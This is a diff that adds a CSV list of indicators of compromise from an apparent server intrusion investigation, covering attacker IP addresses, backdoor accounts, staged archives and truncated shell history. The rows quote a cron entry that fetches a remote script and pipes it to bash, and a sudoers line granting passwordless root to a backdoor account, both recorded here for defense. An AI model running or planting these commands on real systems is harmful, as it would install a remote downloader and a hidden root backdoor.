@@ -1,0 +1,9 @@
+indicator,type,category,source_event,first_seen,description
+198.51.100.23,ipv4-addr,network,EVT-02;EVT-03;EVT-09,2026-03-10T03:14:02Z,Brute-force origin; backdoor login origin; repeat probing
+192.0.2.99,ipv4-addr,network,EVT-06;EVT-08,2026-03-10T03:20:04Z,Cron-based C2 downloader target; likely exfiltration destination
+sysupdate,username,account,EVT-05,2026-03-10T03:47:11Z,Backdoor account created with passwordless (NOPASSWD:ALL) root sudo; UID 1002 / GID 1002
+backup,username,account,EVT-03,2026-03-10T03:45:16Z,Compromised low-privilege service account used as initial entry point; UID 1001
+*/10 * * * * curl -s http://192.0.2.99/update.sh | bash,cron-entry,persistence,EVT-06,2026-03-10T03:48:26Z,Malicious cron entry acting as malware downloader / C2 beacon
+sysupdate ALL=(ALL) NOPASSWD:ALL,sudoers-entry,persistence,EVT-05,2026-03-10T03:47:46Z,Appended sudoers line granting passwordless root to the backdoor account
+/tmp/.cache_bkp.tar.gz,file-path,host,EVT-08,2026-03-10T03:23:10Z,Hidden non-standard archive of /var/www/html and /etc/nginx staged for likely exfiltration
+.bash_history,file-path,host,EVT-07,2026-03-10T03:48:51Z,Shell history file truncated as anti-forensic evidence destruction
